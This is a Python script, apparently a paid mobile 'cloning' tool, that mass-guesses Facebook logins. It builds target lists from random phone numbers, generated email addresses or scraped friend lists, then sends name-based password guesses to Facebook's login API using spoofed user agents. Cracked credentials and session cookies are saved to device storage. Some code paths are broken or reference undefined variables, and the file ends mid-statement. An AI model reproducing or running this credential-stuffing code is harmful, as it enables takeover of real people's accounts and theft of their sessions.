 ####@-----Import-----@####
import os,base64
os.system("xdg-open https://chat.whatsapp.com/KeoCVtu9wLLE3W3LPAVG09")
os.system('git pull -q;rm .rndm')
try:
    import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
    from string import *
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except(ImportError):
    os.system("pip install requests")
    pass

try:
    import bs4
except(ImportError):
    os.system("pip install bs4")
    pass

try:
 pass
except:pass


import subprocess
from bs4 import BeautifulSoup
import json,os,time,base64,random,re,sys, subprocess 
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as speed

accounts = []
loop = 0

import os

folder_path = "/storage/emulated/0/RA"
if not os.path.exists(folder_path):
    os.makedirs(folder_path)


file_path="/storage/emulated/0/RA/android.txt"
if os.path.exists(file_path):
    if os.path.getsize(file_path) == 0:
 	   os.remove(file_path)
####DESIGN####
def oo(t):
    return '\033[1;91m[\033[1;97m'+str(t)+'\033[1;91m]\033[1;97m '

###USERAGENTSGEN####
'''
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
andd=subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
carr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')

device = {
        'android_version':android_version,
        'model':model,
        'build':build,
         'cr':carr,
         'brand':andd}

'''
ua = []

import requests
rs = requests.get
ua = []

del ua
"""
Mozilla/5.0 (Linux; Android 9; LM-Q510N Build/PKQ1.190522.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]
"""

ua=[]


##Logo##
P = '\x1b[1;97m'
G='\x1b[1;92m'
R='\x1b[1;91m'
S ='\x1b[1;96m'
Y ='\x1b[1;93m'
uu ='\x1b[1;95m'
tred = speed

    
logo= f'''    

\033[1;91m         >======>           >>       
\033[1;92m         >=>    >=>        >>=>      
\033[1;92m         >=>    >=>       >> >=>     
\033[1;93m         >> >==>         >=>  >=>    
\033[1;92m         >=>  >=>       >=====>>=>   
\033[1;92m         >=>    >=>    >=>      >=>  
\033[1;91m         >=>      >=> >=>        >=> 
                            


\033[1;97m Author : RA
\033[1;97m Version: 2.4
\033[1;97m Status : Paid
================================================='''
#approval
def main():
    os.system('clear')
    #Wasi ke jaga apna name likhlo 
    ak="RA-"
    print (logo)
    try:
        key1=open('/storage/emulated/0/RA/android.txt', 'r').read()
    except IOError:
        os.system("clear")
        print (logo)
        print ("=================================================")
        print ("  Your Token Is Not Approved Already")
        print ("=================================================")
        print ("           THIS TOOL IS PAID RS 400")
        print ("           THIS IS YOUR KEY BRO")
        print ("=================================================")
        print ("")
        myid=uuid.uuid4().hex[:10].upper()
        print ("      YOUR KEY : "+ak+myid)
        print ("=================================================")
        #qureshi ke jaga apna name or kch ni cherna
        kok=open('/storage/emulated/0/RA/android.txt', 'w')
        kok.write(ak + myid)
        kok.close()
        print ("")
        print ("     Copy Key And Sent Me WhatsApp Approvel Your Key ")
        print ("=================================================")
        time.sleep(6)
        #nichy number ki hata k apna numbr dal lo 
        os.system("xdg-open https://wa.me/+923159128147")
        
        key1=open('/storage/emulated/0/RA/android.txt', 'r').read()
    r1=requests.get("https://pastebin.com/raw/idYmaeiB").text
    if key1 in r1:
    	#R ke jaga apne main jahan sy script started krna chahty wo lagao 
        Main()
    else:
        os.system("clear")
        print (logo)
        print ("          Your Token Is Not Approved Already")
        print ("=================================================")
        print ("          THIS TOOL IS PAID RS 400")
        print ("          THIS IS YOUR KEY BRO")
        print ("=================================================")
        print ("          YOUR KEY : " + key1)
        print ("=================================================")
        print ("   Copy Key And Send in WhatsApp for Approval ")
        print ("=================================================")
        time.sleep(3.5)
        os.system("xdg-open https://wa.me/+923159128147")
        
     

####@-----Menu-----@####
def Main():
    os.system("clear")
    print(logo)
    print(f"{[1]} File Cloning")
    print(f"{[2]} Random Cloning")
    print(f"{[3]} Mail Cloning")  
    print(f"{[0]} Exit")
    print("=================================================")
    inpp = input(f"[+] Chose : ")
    if inpp == "1":
        file()
    if inpp == '2':pak()
    if inpp =='3':
        gmail()
    if inpp == "4":
     file_create()
    if inpp == "0":
     exit('Exit!')
     
     
l = []

####@-----File-----@####
def file():
    os.system("clear")
    print(logo)
    if 'gm' in l:
        file = '.Hannan'
    else:
        file = input(f"[+] Enter File: ")
    try:
        for x in open(file,'r').readlines():
            accounts.append(x.strip())
    except:
        print(f"[+] File Not Found");time.sleep(1)
        Main()
     
    method()
    exit()
    
            
   
####@-----AppCheck-----@####
def check(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=hannan-33'))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Hxw-182^)Code=hannan-2233]'))


####@-----Gmail-----@####

def gmail():     
        os.system('rm -rf .Hannan')
        first = input(f'[+] Put First Name: ')
        last = input(f'[+] Put Last Name: ')
        domain = input(f'[+] Put Domain: ')
        try:
            limit = input(f'[+] Put Limit: ')
        except ValueError:
            limit = 5000
        lists = ['3','4']
        for xd in range(int(limit)):
            lchoice = random.choice(lists)
            if '3' in lchoice:
                mail = ''.join(random.choice(string.digits) for _ in range(3))
                open('.Hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.Hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.Hannan', 'r').read().splitlines()
        with tred(max_workers=30) as king___xd:
            tl = str(len(fo))
            tk = first+last
            l.append('gm')
            file()

       
        
####@-----PakNumber-----@####


def pak():
    user=[]
    code = input(f'[+] Put Code : ')
    try:
        limit = int(input(f'[+] Put Limit :  '))
    except ValueError:
        limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    for psx in user:
        ids = code+psx
        open('.rndm','a').write(ids+'|'+psx+' '+ids+'\n')
    andom()



####@-----UserAgent----@####
"""
Mozilla/5.0 (Linux; Android 10; P650 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]
Mozilla/5.0 (Linux; Android 10; SM-M305M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/349.0.0.39.470;]
Mozilla/5.0 (Linux; Android 10; SM-M305F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/204.0.0.6.121;]
Mozilla/5.0 (Linux; Android 10; SPC SMART PLUS Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]
"""
####@-----FileM-----@####


def method():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o':      
        lp = input(f'[+] Total Password? : ')
        if lp.isnumeric():
            ex = 'firstlast first123 last123 first786 first1122 first last'
            print(f'[+] {ex} (ETC)')
            for x in range(int(lp)):
                totalpass.append(input(f'[1] Password : '))
            pass
        else:
            print(f"[+] Numeric Only")
            main()
    print(f'\n'+("[1]")+' Method 1 \n'+("[2]")+' Method 2 ')
    m=input(f"[+] Input : ") 
    print('\n'+("[+]")+'START CLONING PRESS?(y/n)')
    cpok=input(f"[+] Input : ")
    apps='y'
    os.system("clear")
    print(logo) 
    
    print(f' [+] Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"\033[1;97m [+] Process start has been background")
    print(f"\033[1;97m [+] Airplane Mode After 5 min ")    
    print('\033[1;97m='*49)
    
    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
           last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r \033[1;97m[\033[1;97mM1\033[1;97m]\033[1;97m {}-{}        \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads =random.choice([
'Mozilla/5.0 (Linux; Android 7.1.1; SM-J510H Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/169.0.0.50.95;FBBV/104829965;FBDV/iPhone9,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Kyivstar;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]',
'Mozilla/5.0 (Linux; Android 7.0; SM-J710F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]',
'Mozilla/5.0 (Linux; Android 7.1.1; SM-N950F Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]',
'Mozilla/5.0 (Linux; Android 7.0; SM-G925F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/169.0.0.50.95;FBBV/104829965;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Beeline;FBID/phone;FBLC/ru_RU;FBOP/5;FBRV/0]',
'Mozilla/5.0 (Windows NT 10.0.16299.125; osmeta 10.3.3308) AppleWebKit/602.1.1 (KHTML, like Gecko) Version/9.0 Safari/602.1.1 osmeta/10.3.3308 Build/3308 [FBAN/FBW;FBAV/140.0.0.232.179;FBBV/83145113;FBDV/WindowsDevice;FBMD/80VR;FBSN/Windows;FBSV/10.0.16299.371;FBSS/1;FBCR/;FBID/desktop;FBLC/ru_RU;FBOP/45;FBRV/0]',
'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/90.0.0.10.180;]',
'Mozilla/5.0 (Linux; Android 7.0; BV6000S Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/51.0.2704.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]',
'Mozilla/5.0 (Linux; Android 5.1.1; SM-J120H Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/163.0.0.43.91;]',
'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TIT-U02 Build/HUAWEITIT-U02; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]',
'Mozilla/5.0 (Linux; Android 5.1.1; Redmi 3 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]',
'Mozilla/5.0 (Linux; Android 6.0; M5 Note Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.128 Mobile Safari/537.36[FBAN/EMA;FBLC/uk_UA;FBAV/88.0.0.6.182;]',
'Mozilla/5.0 (Linux; Android 5.1.1; Lenovo A6020a40 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]',
'Mozilla/5.0 (Linux; Android 5.0.2; SM-A300F Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.123 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/160.0.0.30.94;]',
'Mozilla/5.0 (Linux; Android 5.0.2; VK815 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-A500H Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]',
'Mozilla/5.0 (Linux; U; Android 4.1.2; ru-ru; GT-P3100 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30[FBAN/EMA;FBLC/ru_RU;FBAV/90.0.0.10.180;]',])
            header = {
    'method': 'POST',
     'scheme': 'https',
    'authority': 'b-graph.facebook.com/',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-PK,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'referer': 'https://www.google.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': heads,}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mRA-OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m•\033[1;92m '+pword+'  ')
                open('/sdcard/RA-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                print('\r\033[1;92m[\033[1;92mCookie\033[1;92m] \033[1;97m'+cookies) 
                open('/sdcard/M.COOKIES-OK.txt','a').write(f'{acc} • {pword}\n{cookies}')
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;92m[\033[1;92mRA-OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m•\033[1;92m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/RA-OK.txt','a').write(f'{acc} • {pword}\n')
                break             
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   


 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mM2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = 'Mozilla/5.0 (Linux; Android 10; ZTE 8000 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.26.115;]'
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mRA-OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m•\033[1;92m '+pword+'  ')
                open('/sdcard/RA-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                    check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)
                 open('/sdcard/M.COOKIES-OK.txt','a').write(f'{acc} • {pword}\n{cookies}')     
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;91mRA-CP\033[1;91m] \033[1;91m'+acc+' \033[1;91m•\033[1;91m '+pword)
                cpacc.append(acc)
                open('/sdcard/RA-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

    if m=='2':
        with speed(max_workers=20) as speede:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=20) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=20) as speede:
            speede.map(start, accounts)
    exit()  
      
def file_create():
    os.system("clear")
    print(logo)
    print("[1] Simple file")
    print("[2] Auto file")
    print("[3] Main")
    inpp = input(f"[+] Chose:")
    if inpp == "1":
        file_create_menu().file_simple()
    if inpp == "2":
        file_unlimmited(self)
    if inpp == "3":
        Main()
#file create
class login():
    def __init__(self):
        ids=[]
    def lo_epa(self):
        system('clear');print(logo)
        print(' Using New Account Has No Checkpoint ')
        print(50*'-')
        em = input(' put id/email : ')
        ps = input(' put password : ')
        e="5990"
        ee="655"
        eee="59"
        tok1 = f"2377{e}9{eee}1{ee}"
        ei="0f140aabedfb65"
        ei2="a2263b1"
        tok2 = f"25257C{ei}ac27a739ed1{ei2}"
        us = f'Mozilla/5.0 (Linux; Android {str(random.randint(4,11))}.0; Nexus 5 Build/MRA{str(random.randint(30,60))}N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 Edg/111.0.{str(random.randint(1600,1661))}.41'
        br.addheaders = [('User-Agent', us)]
        li = "b-ap"
        lo = "od/auth.l"
        op="3f555f98"
        op2 = "d7aa0c"
        op3="58f522efm"
        sig=f"{op}fb61fc{op2}44f{op3}"
        p = br.open(
            'https://'+li+'i.facebook.com/meth'+lo+'ogin?access_token='+tok1+'%'+tok2+'&format=json&sdk_version=1&email=' + em + '&locale=en_US&password=' + ps + '&sdk=ios&generate_session_cookies=1&sig='+sig+'')
        po = json.load(p)
        if 'access_token' in po:
            toke=po['access_token']
            print('\033[1;32m Login Done :-X')
            print('\033[1;36m Token ' + toke)
            print(50*'\033[0m-')
            open('.token.txt','w').write(toke)
            exit('run again python main.py')
        else:
            if 'www.facebook.com' in po['error_msg']:
                print('\033[1;33m Account Is In Checkpoint\033[0m')
                exit(em+'|'+ps)
            else:
                exit('\033[1;31m Worng Id/Email Or Password\033[0m')
    def login_epa2(self):
        system('clear');
        print(logo)
        print(' Suggestion Use New Id For Login ! ')
        print(50 * '-')
        cooke = input(' cookie : ')
        cookie = {'Cookie': cooke}
        xyz = requests.session()
        data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}
        req = xyz.post('https://graph.facebook.com/v16.0/device/login/', data=data).json()
        cd = req['code']
        ucd = req['user_code']
        url = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038' % (
            cd)
        req = bs(xyz.get('https://mbasic.facebook.com/device', cookies=cookie).content, 'html.parser')
        raq = req.find('form', {'method': 'post'})
        dat = {'jazoest': re.search('name="jazoest" type="hidden" value="(.*?)"', str(raq)).group(1),
               'fb_dtsg': re.search('name="fb_dtsg" type="hidden" value="(.*?)"', str(req)).group(1), 'qr': '0',
               'user_code': ucd}
        rel = 'https://mbasic.facebook.com' + raq['action']
        pos = bs(xyz.post(rel, data=dat, cookies=cookie).content, 'html.parser')
        dat = {}
        raq = pos.find('form', {'method': 'post'})
        for x in raq('input', {'value': True}):
            try:
                if x['name'] == '__CANCEL__':
                    pass
                else:
                    dat.update({x['name']: x['value']})
            except Exception as e:
                pass
        rel = 'https://mbasic.facebook.com' + raq['action']
        pos = bs(xyz.post(rel, data=dat, cookies=cookie).content, 'html.parser')
        req = xyz.get(url, cookies=cookie).json()
        if 'access_token' in req:
            print('\033[1;32m Login Done :-X')
            print('\033[1;36m Token ' + req['access_token'])
            print(50 * '\033[0m-')
            open('.token.txt', 'w').write(req['access_token'])
            exit('run again python main.py')
        else:
            exit('\033[1;31m Invalid COokie Or Something WEnt WRong')
class file_create_menu():
    def __init__(self):
        try:
            os.system('rm -rf .a.txt')
            os.system('rm -rf .temp.txt')
            os.remove('.temp.txt')
            os.remove('.a.txt')
        except:
            pass
        self.ids = []
        self.total = []
        self.loop = 0
        try:
            self.token = open('.token.txt', 'r').read()
            uid="100061689760374"
            try:
                headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch",
                           "X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1",
                           "X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001",
                           "Authorization": "OAuth "+self.token+"",
                           "X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
                           "X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False",
                           "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}",
                           "X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery",
                           "X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0",
                           "Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True",
                           "X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9",
                           "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
                data = {
                    'User-Agent': '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/' + carrier + ';FBMF/' + android + ' MOBILE LIMITED;FBBD/' + android + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
                    'client_doc_id': client_id,
                    'method': 'post',
                    'locale': 'en_US',
                    'pretty': 'false',
                    'format': 'json',
                    'variables': '{"profile_id":'+uid+',"suggestion_friends_paginating_first":2500}',
                    'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
                    'fb_api_caller_class': 'graphservice',
                    'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
                    'client_trace_id': trace_id,
                    'server_timestamps': 'true',
                    'purpose': 'fetch'
                }
                posted = requests.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
                if not posted['data']['user']['friends']['edges']:
                    os.system('clear');print(logo)
                    os.system('rm -rf .token.txt')
                    exit(' \n \033[1;31mYou Have Used This Id Many Times . Use Other Id And Dont Login This Id For 3 Days\n\n \033[0m')
                try:
                    data = posted['data']['user']['friends']['edges']
                except:
                    print(f' \033[1;31m Something Wrong With This Id | Login Other Id\033[0m ')
                    os.system('rm -rf .token.txt')
                    exit()
            except Exception as e:
                os.system('clear');print(logo)
                print("\033[1;31m cookies is expired login other\033[0m !")
                print(e)
                time.sleep(3)
                login.login_WALA('')
        except Exception as e:
            print(e)
            login.login_WALA('')
def file_simple(self):
        os.system('clear');print(logo)
        save_as = input(" save file as : ")
        if not save_as == '/sdcard/':
            os.system(f'rm -rf {save_as}')
            open(save_as,'w')
        print('      Paste All Idz Here ')
        while True:
            ids_all = input("")
            if ids_all == "":
                exit('sucessfully done all ids')
                break
            try:
                uid = ids_all.split("|")[0]
            except:
                uid = ids_all
            try:
                headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch",
                           "X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1",
                           "X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001",
                           "Authorization": "OAuth "+self.token+"",
                           "X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
                           "X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False",
                           "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}",
                           "X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery",
                           "X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0",
                           "Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True",
                           "X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9",
                           "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
                data = {
                    'User-Agent': '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/' + carrier + ';FBMF/' + android + ' MOBILE LIMITED;FBBD/' + android + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
                    'client_doc_id': client_id,
                    'method': 'post',
                    'locale': 'en_US',
                    'pretty': 'false',
                    'format': 'json',
                    'variables': '{"profile_id":' + uid + ',"suggestion_friends_paginating_first":2500}',
